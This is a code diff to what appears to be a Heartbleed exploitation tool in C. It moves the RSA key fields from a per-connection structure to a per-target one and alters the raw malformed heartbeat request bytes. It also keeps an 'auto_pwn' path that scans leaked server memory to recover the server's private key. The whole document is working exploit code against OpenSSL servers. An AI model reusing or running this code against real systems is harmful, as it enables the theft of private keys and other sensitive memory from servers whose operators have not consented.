@@ -158,8 +158,6 @@ struct Connection {
     } event;
     unsigned is_alert:1;
     unsigned is_sent_good_heartbeat:1;
-    BIGNUM n;
-    BIGNUM e;
 
     size_t buf2_count;
     unsigned char buf2[70000];
@@ -245,6 +243,8 @@ struct Target {
     char *http_request;
     unsigned starttls;
     unsigned application;
+    BIGNUM n;
+    BIGNUM e;
 };
 
 struct TargetList {
@@ -900,7 +900,6 @@ process_bleed(const struct DumpArgs *args_in,
 
     /* do a live analysis of the bleeding data */
     if (args->is_auto_pwn) {
-
         if (find_private_key(n, e, buf, buf_size)) {
             printf("key found!\n");
             exit(1);
@@ -1684,9 +1683,9 @@ ssl_thread_raw(int fd, const struct DumpArgs *args, struct Target *target,
      * Send heartbeat request
      */
     rec.heartbleed.state = 0;
-resend:
+//resend:
     x = send(fd, "\x18\x03\x03\x00\x03"
-                 "\x01\xff\xff", 8, MSG_NOSIGNAL);
+                 "\x01\x40\x00", 8, MSG_NOSIGNAL);
     if (x < 3) {
         ERROR_MSG("[-] raw handshake: %s (%u)\n",
             error_msg(WSAGetLastError()), WSAGetLastError());
@@ -1737,7 +1736,7 @@ end:
     if (connection->buf2_count) {
         DEBUG_MSG("[+] received %u bytes of heartbleed\n", connection->buf2_count);
         process_bleed(args, connection->buf2, connection->buf2_count,
-                        connection->n, connection->e);
+                        target->n, target->e);
         connection_buf_init(connection);
     }
 
@@ -1775,8 +1774,6 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
     memset(connection, 0, sizeof(connection[0]));
     connection->args = args;
     connection->target = target;
-    BN_init(&connection->n);
-    BN_init(&connection->e);
 
     /*
      * If we are doing a proxy, then switch the target hostname
@@ -1912,7 +1909,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
     /*
      * If doing mid-handshake heartbeats, then switch to that
      */
-    if (args->is_raw) {
+    if (args->is_raw > 1) {
         ssl_thread_raw(fd, args, target, connection);
         goto end;
     }
@@ -2017,7 +2014,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
 
         cert = SSL_get_peer_certificate(ssl);
         if (cert) {
-            parse_cert(cert, name, &connection->n, &connection->e);
+            parse_cert(cert, name, &target->n, &target->e);
             X509_free(cert);
         }
     }
@@ -2029,6 +2026,10 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
         ERROR_MSG("[-] target doesn't support heartbeats\n");
         connection->heartbleeds.failed++;
     }
+
+    if (args->is_raw)
+        ((struct DumpArgs*)args)->is_raw++;
+    
 
     /*
      * Loop many times
@@ -2062,7 +2063,7 @@ again:
      */
     if (connection->buf2_count) {
         process_bleed(args, connection->buf2, connection->buf2_count,
-                      connection->n, connection->e);
+                      target->n, target->e);
         connection_buf_init(connection);
     }
 
@@ -2254,7 +2255,7 @@ again:
     DEBUG_MSG("[+] connection terminated\n");
 end:
     process_bleed(args, connection->buf2, connection->buf2_count,
-                  connection->n, connection->e);
+                  target->n, target->e);
     connection_buf_init(connection);
     SSL_free(ssl);
     SSL_CTX_free(ctx);
@@ -2739,6 +2740,9 @@ run_scan(const struct DumpArgs *args, size_t start, size_t stop)
         unsigned is_starttls = 0;
 
         target = args->targets.list[i];
+
+        BN_init(&target.n);
+        BN_init(&target.e);
 
         target.loop.desired = args->cfg_loopcount;
 
